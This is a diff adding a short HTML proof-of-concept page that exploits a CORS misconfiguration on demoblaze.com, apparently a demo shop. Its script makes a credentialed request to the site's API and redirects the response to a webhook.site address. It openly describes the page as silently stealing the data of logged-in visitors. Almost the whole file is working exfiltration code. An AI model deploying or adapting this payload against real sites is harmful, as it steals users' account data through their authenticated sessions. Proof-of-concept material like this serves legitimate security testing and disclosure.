@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CORS PoC</title>
+  </head>
+  <body>
+    <h2>CORS Proof of Concept</h2>
+    <p>If you're logged in to demoblaze.com, this will silently steal your data.</p>
+    <script>
+      var req = new XMLHttpRequest();
+      req.onload = function () {
+        // Send stolen data to your webhook or display it
+        location = 'https://webhook.site/https://demoblaze.com/index.html#?data=' + encodeURIComponent(this.responseText);
+      };
+      req.open('GET','https://api.demoblaze.com/view', true);
+      req.withCredentials = true;
+      req.send();
+    </script>
+  </body>
+</html>
